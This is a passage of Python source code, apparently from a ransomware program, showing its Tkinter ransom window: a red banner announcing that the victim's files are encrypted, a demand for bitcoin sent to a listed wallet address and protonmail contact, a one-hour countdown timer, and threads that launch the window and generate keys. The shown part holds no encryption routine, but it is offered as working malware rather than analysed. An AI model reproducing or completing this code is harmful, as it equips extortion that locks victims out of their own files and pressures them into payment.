        label.grid(row=5, column=0, rowspan=2)
        label = Label(self, image=photo, background='black')
        label.image = photo
        label.grid(row=5, column=3, rowspan=2)
        message = f'''
              YOUR FILES HAVE BEEN ENCRYPTED !

  TO RECOVER YOUR FILES SEND US 10$ BITCOIN
  AND SEND THE PAY CONFIRMATION WITH YOUR
  TASK NUMBER TO : h3xv1ss1on@protonmail.com

  BITCOIN : 1782x9AtVCQgv6GPjb9uHj1EoFhQocgEMs
  TASK NUMBER : %s


                                  Suki@H3xv1ss1on
'''%(self.special_key)
        Label(self, text=message, wraplength=550, font='Helvetica 14 bold', foreground='white', background='red').grid(row=0, column=0, columnspan=4)
        Label(self, text='', font='Helvetica 18 bold', foreground='red', background='black').grid(row=5, column=2)
        Label(self, text='', font='Helvetica 18 bold', foreground='red', background='black').grid(row=6, column=2)
        def start_thread():
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()
        def start_timer():
            Label(self, text='TIME LEFT:', font='Helvetica 18 bold', foreground='red', background='black').grid(row=5, column=0, columnspan=4)
            try:
                s = 3600
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)
                    Label(self, text=time_left, font='Helvetica 18 bold', foreground='red', background='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    s -= 1
                    if s == 1:
                      message = "Sorry :( Contact me in Yosoevsky@protonmail.com i ll help you"
                      Label(self, text=message, wraplength=1000, font='Helvetica 14 bold', foreground='white', background='black').grid(row=0, column=0, columnspan=4)                    
            except KeyboardInterrupt:
                pass
        start_thread()
def a():
    main = mainwindow("#0x00" + pass_gen(25, "without"))
    main.mainloop()
def b():
    for UI in range(100):
        key = pass_gen(32, "with")

threading.Thread(target=a).start()
threading.Thread(target=b).start()

